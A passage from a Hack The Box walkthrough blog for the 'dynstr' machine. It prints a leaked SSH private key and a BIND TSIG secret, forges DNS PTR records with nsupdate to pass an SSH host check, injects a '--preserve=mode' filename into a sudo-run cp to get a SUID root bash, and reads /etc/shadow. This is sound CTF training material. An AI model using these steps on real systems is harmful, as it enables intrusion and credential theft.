<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .</span><br><span class="line">drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..</span><br><span class="line">lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout</span><br><span class="line">-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc</span><br><span class="line">drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache</span><br><span class="line">-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile</span><br><span class="line">drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh</span><br><span class="line">drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521</span><br><span class="line">-r-------- 1 bindmgr bindmgr   33 Jun 13 00:03 user.txt</span><br></pre></td></tr></table></figure>

<p>Looks like we have access .ssh so let’s look into it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .</span><br><span class="line">drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 ..</span><br><span class="line">-rw-r--r-- 1 bindmgr bindmgr  419 Mar 13 12:00 authorized_keys</span><br><span class="line">-rw------- 1 bindmgr bindmgr 1823 Mar 13 11:48 id_rsa</span><br><span class="line">-rw-r--r-- 1 bindmgr bindmgr  395 Mar 13 11:48 id_rsa.pub</span><br><span class="line">-rw-r--r-- 1 bindmgr bindmgr  444 Mar 13 12:09 known_hosts</span><br></pre></td></tr></table></figure>

<p>We can get the id_rsa.pub,known host and authorized_keys but not id_rsa that sucks.</p>
<p>Let’s check authorized_keys first.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> authorized_keys</span><br><span class="line">from=<span class="string">&quot;*.infra.dyna.htb&quot;</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen</span><br></pre></td></tr></table></figure>

<p>We can connect to bindmgr using his private key if we satisfy this DNS record condition *.infra.dyna.htb but can’t get into that until we have the id_rsa even if we pass the check.</p>
<p>Looking inside home directory we have access to another unsual and intresting directory support-case-C62796521.<br>Let’s look into it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 436</span><br><span class="line">drwxr-xr-x 2 bindmgr bindmgr   4096 Mar 13 14:53 .</span><br><span class="line">drwxr-xr-x 5 bindmgr bindmgr   4096 Mar 15 20:39 ..</span><br><span class="line">-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 14:53 C62796521-debugging.script</span><br><span class="line">-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13 14:53 C62796521-debugging.timing</span><br><span class="line">-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13 14:53 command-output-C62796521.txt</span><br><span class="line">-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 14:52 strace-C62796521.txt</span><br></pre></td></tr></table></figure>

<p>let’s check all the files</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;-----SNIP------&gt;</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1</span><br><span class="line">42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3</span><br><span class="line">HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F</span><br><span class="line">L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn</span><br><span class="line">UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX</span><br><span class="line">CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz</span><br><span class="line">uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a</span><br><span class="line">XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P</span><br><span class="line">ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk</span><br><span class="line">+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs</span><br><span class="line">4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq</span><br><span class="line">xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD</span><br><span class="line">PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k</span><br><span class="line">obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l</span><br><span class="line">u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS</span><br><span class="line">TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A</span><br><span class="line">Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE</span><br><span class="line">BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv</span><br><span class="line">C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX</span><br><span class="line">Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt</span><br><span class="line">U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ</span><br><span class="line">b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5</span><br><span class="line">rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG</span><br><span class="line">jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line">&lt;-----SNIP------&gt;</span><br></pre></td></tr></table></figure>

<p>We have the output key in strace file.<br>strace-C62796521.txt<br>So now we have the private key now we can start working on the DNS condition part for SSH login.</p>
<h2 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>As we know that PTR records provides the domain name associated with an IP so we have to add PTR record that matches the above regex that is pointing to our IP.</p>
<p>First of all to edit the records for infra we have to get the key for infra so let’s get it by going to &#x2F;etc&#x2F;bind&#x2F;infra.key</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/bind/infra.key</span><br><span class="line">key <span class="string">&quot;infra-key&quot;</span> &#123;</span><br><span class="line">        algorithm hmac-sha256;</span><br><span class="line">        secret <span class="string">&quot;7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=&quot;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Now that we have the key we can bind out record into DNS so let’s try that.<br>First we have to load up the nslookup console and import the keyfile.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nsupdate -k /etc/bind/infra.key</span><br></pre></td></tr></table></figure>

<p>Then let’s add the A record for our host</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update add test.infra.dyna.htb 86400 A 10.10.14.5</span><br><span class="line"></span><br><span class="line">update add 5.14.10.10.in-addr.arpa 300 PTR test.infra.dyna.htb</span><br></pre></td></tr></table></figure>

<p>For eg- your ip is 10.10.14.127<br>Reverse ip is 127.14.10.10<br>It’s is important to leave a line after addition of the A record or else it will give you an update failed: NOTZONE error.<br>so after this let’s see what we are adding.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nsupdate -k /etc/bind/infra.key</span><br><span class="line">update add oops.infra.dyna.htb 86400 A 10.10.14.5</span><br><span class="line"></span><br><span class="line">update add 5.14.10.10.in-addr.arpa 86400 PTR oops.infra.dyna.htb</span><br><span class="line">show</span><br><span class="line">Outgoing update query:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- <span class="string">opcode: UPDATE, status: NOERROR, id:      0</span></span><br><span class="line"><span class="string">;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0</span></span><br><span class="line"><span class="string">;; UPDATE SECTION:</span></span><br><span class="line"><span class="string">5.14.10.10.in-addr.arpa. 86400  IN      PTR     oops.infra.dyna.htb.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">send</span></span><br><span class="line"><span class="string">quit</span></span><br></pre></td></tr></table></figure>

<p>And then after that send it and quit.<br>now let’s copy the above RSA key in a id_rsa file and let’s SSH.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># chmod 700 id_rsa</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/dynstr]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa bindmgr@dyna.htb                                                                                                            </span></span><br><span class="line">Last login: Sun Jun 13 19:22:54 2021 from test.infra.dyna.htb</span><br><span class="line">bindmgr@dynstr:~$ <span class="built_in">id</span></span><br><span class="line">uid=1001(bindmgr) gid=1001(bindmgr) <span class="built_in">groups</span>=1001(bindmgr)</span><br><span class="line">bindmgr@dynstr:~$ <span class="built_in">whoami</span></span><br><span class="line">bindmgr</span><br><span class="line">bindmgr@dynstr:~$ <span class="built_in">ls</span></span><br><span class="line">id_rsa  root.txt  support-case-C62796521  user.txt</span><br><span class="line">bindmgr@dynstr:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">32ce9c7cacb7d79e7ae424b0c42b6647</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2004.jpg"></li>
</ul>
<p>And we are bindmgr let’s get root now.</p>
<h1 id="PrivESC"><a href="#PrivESC" class="headerlink" title="PrivESC"></a>PrivESC</h1><h2 id="Enumeration-2"><a href="#Enumeration-2" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bindmgr@dynstr:/tmp$ sudo -l</span><br><span class="line">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> bindmgr on dynstr:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User bindmgr may run the following commands on dynstr:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh</span><br></pre></td></tr></table></figure>

<p>Looks like we can run &#x2F;usr&#x2F;bin&#x2F;local&#x2F;bindmgr.sh as root so let’s look into script.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment"># This script generates named.conf.bindmgr to workaround the problem</span></span><br><span class="line"><span class="comment"># that  bind/named can only include single files but no directories.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span></span><br><span class="line"><span class="comment"># from named.conf.local (or others) and will include all files from the</span></span><br><span class="line"><span class="comment"># directory /etc/bin/named.bindmgr.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> The script is work in progress. For now bind is not including</span></span><br><span class="line"><span class="comment">#named.conf.bindmgr.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Currently the script is only adding files to the directory but</span></span><br><span class="line"><span class="comment">#not deleting them. As we generate the list of files to be included</span></span><br><span class="line"><span class="comment">#from the source directory they won&#x27;t be included anyway.</span></span><br><span class="line"></span><br><span class="line">BINDMGR_CONF=/etc/bind/named.conf.bindmgr</span><br><span class="line">BINDMGR_DIR=/etc/bind/named.bindmgr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">indent</span></span>() &#123; sed <span class="string">&#x27;s/^/    /&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check versioning (.version)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Running <span class="variable">$0</span> to stage new configuration from <span class="variable">$PWD</span>.&quot;</span></span><br><span class="line"><span class="keyword">if</span> [[ ! -f .version ]] ; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;[-] ERROR: Check versioning. Exiting.&quot;</span></span><br><span class="line">	<span class="built_in">exit</span> 42</span><br><span class="line"><span class="keyword">fi</span>  </span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;`cat .version 2&gt;/dev/null`&quot;</span> -le <span class="string">&quot;`cat <span class="variable">$BINDMGR_DIR</span>/.version 2&gt;/dev/null`&quot;</span> ]] ; <span class="keyword">then</span>                                                                     [0/598]</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;[-] ERROR: Check versioning. Exiting.&quot;</span></span><br><span class="line">	<span class="built_in">exit</span> 43</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># Create config file that includes all files from named.bindmgr.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Creating <span class="variable">$BINDMGR_CONF</span> file.&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;// Automatically generated file. Do not modify manually.\n&#x27;</span> &gt; <span class="variable">$BINDMGR_CONF</span> </span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> * ; <span class="keyword">do</span></span><br><span class="line">	<span class="built_in">printf</span> <span class="string">&#x27;include &quot;/etc/bind/named.bindmgr/%s&quot;;\n&#x27;</span> <span class="string">&quot;<span class="variable">$file</span>&quot;</span> &gt;&gt; <span class="variable">$BINDMGR_CONF</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage new version of configuration files.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Staging files to <span class="variable">$BINDMGR_DIR</span>.&quot;</span> </span><br><span class="line"><span class="built_in">cp</span> .version * /etc/bind/named.bindmgr/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check generated configuration with named-checkconf.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Checking staged configuration.&quot;</span> </span><br><span class="line">named-checkconf <span class="variable">$BINDMGR_CONF</span> &gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [[ $? -ne 0 ]] ; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;[-] ERROR: The generated configuration is not valid. Please fix following errors: &quot;</span></span><br><span class="line">	named-checkconf <span class="variable">$BINDMGR_CONF</span> 2&gt;&amp;1 | indent</span><br><span class="line">	<span class="built_in">exit</span> 44</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;[+] Configuration successfully staged.&quot;</span></span><br><span class="line">	<span class="comment"># *** TODO *** Uncomment restart once we are live.</span></span><br><span class="line">	<span class="comment"># systemctl restart bind9</span></span><br><span class="line">	<span class="keyword">if</span> [[ $? -ne 0 ]] ; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;[-] Restart of bind9 via systemctl failed. Please check logfile: &quot;</span></span><br><span class="line">		systemctl status bind9</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">&quot;[+] Restart of bind9 via systemctl succeeded.&quot;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>Looking at the script we can see that we need a .version file in the current directory with a version number so let’s create it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindmgr@dynstr:/dev/shm$ <span class="built_in">echo</span> <span class="string">&quot;2&quot;</span> &gt; .version</span><br></pre></td></tr></table></figure>

<p>we can see from the script that we can get the privilege on the binary in the same directory so let’s get &#x2F;bin&#x2F;bash to this directory.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindmgr@dynstr:/dev/shm$ <span class="built_in">cp</span> /bin/bash .</span><br></pre></td></tr></table></figure>

<p>Now let’s give it a suid bit and preserve that mode on that binary so now when we will execute the script we will get root privileged binary in &#x2F;etc&#x2F;bind&#x2F;named.bindmgr&#x2F;</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bindmgr@dynstr:/dev/shm$ <span class="built_in">chmod</span> +s bash</span><br><span class="line">bindmgr@dynstr:/dev/shm$ <span class="built_in">echo</span> &gt; --preserve=mode</span><br><span class="line">bindmgr@dynstr:/dev/shm$ <span class="built_in">ls</span> -la</span><br><span class="line">total 1164</span><br><span class="line">drwxrwxrwt  2 root    root        100 Jun 14 08:41  .</span><br><span class="line">drwxr-xr-x 17 root    root       3940 Jun 12 21:02  ..</span><br><span class="line">-rwsr-sr-x  1 bindmgr bindmgr 1183448 Jun 14 08:40  bash</span><br><span class="line">-rw-rw-r--  1 bindmgr bindmgr       1 Jun 14 08:41 <span class="string">&#x27;--preserve=mode&#x27;</span></span><br><span class="line">-rw-rw-r--  1 bindmgr bindmgr       2 Jun 14 08:40  .version</span><br></pre></td></tr></table></figure>

<p>Now let’s execute the sudo command and get the root privileges on our bash binary.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bindmgr@dynstr:/dev/shm$ sudo /usr/local/bin/bindmgr.sh </span><br><span class="line">sudo: unable to resolve host dynstr.dyna.htb: Name or service not known</span><br><span class="line">[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.</span><br><span class="line">[+] Creating /etc/bind/named.conf.bindmgr file.</span><br><span class="line">[+] Staging files to /etc/bind/named.bindmgr.</span><br><span class="line">[+] Checking staged configuration.</span><br><span class="line">[-] ERROR: The generated configuration is not valid. Please fix following errors: </span><br><span class="line">    /etc/bind/named.bindmgr/bash:1: unknown option <span class="string">&#x27;ELF...&#x27;</span></span><br><span class="line">    /etc/bind/named.bindmgr/bash:14: unknown option <span class="string">&#x27;hȀE&#x27;</span></span><br><span class="line">    /etc/bind/named.bindmgr/bash:40: unknown option <span class="string">&#x27;YF&#x27;</span></span><br><span class="line">    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">bindmgr@dynstr:/dev/shm$ <span class="built_in">ls</span></span><br><span class="line"> bash  <span class="string">&#x27;--preserve=mode&#x27;</span></span><br><span class="line">bindmgr@dynstr:/dev/shm$ <span class="built_in">ls</span> -al</span><br><span class="line">total 1164</span><br><span class="line">drwxrwxrwt  2 root    root        100 Jun 13 19:22  .</span><br><span class="line">drwxr-xr-x 17 root    root       3960 Jun 13 15:38  ..</span><br><span class="line">-rwsr-sr-x  1 bindmgr bindmgr 1183448 Jun 13 19:20  bash</span><br><span class="line">-rw-rw-r--  1 bindmgr bindmgr       1 Jun 13 19:22 <span class="string">&#x27;--preserve=mode&#x27;</span></span><br><span class="line">-rw-rw-r--  1 bindmgr bindmgr       2 Jun 13 19:17  .version</span><br></pre></td></tr></table></figure>

<p>Now let’s run the bash as the privileged as root.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p </span><br><span class="line">bash-5.0<span class="comment"># id</span></span><br><span class="line">uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(<span class="built_in">bind</span>) <span class="built_in">groups</span>=117(<span class="built_in">bind</span>),1001(bindmgr)</span><br><span class="line">bash-5.0<span class="comment"># cat /etc/shadow | grep root</span></span><br><span class="line">root:$6<span class="variable">$knCJjR0E8SuLyI5</span>.<span class="variable">$r7dGtVVY</span>/Z6X0RQKxUvBZY4BQ3DwL7kHtu5YO9cclorPryKq489j2JqN262Ows/aRZvFkQ1R9uQyqoVWeS8ED1:18705:0:99999:7:::</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2005.jpg"></li>
</ul>
<p>Now we are root let’s get all the flags.</p>
<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
<li>DNS Enumeration to find some subdomains</li>
<li>Directory Fuzzing using ffuf</li>
<li>use HTTPBasicAuth get a rev shell</li>
<li>add PTR record pointing to our IP to ssh into the shell</li>
<li>privesc through &#x2F;usr&#x2F;bin&#x2F;local&#x2F;bindmgr.sh script</li>
</ul>
<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/06/14/dynstr/" title="Hack-The-Box-walkthrough[dynstr]">https://fdlucifer.github.io/2021/06/14/dynstr/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
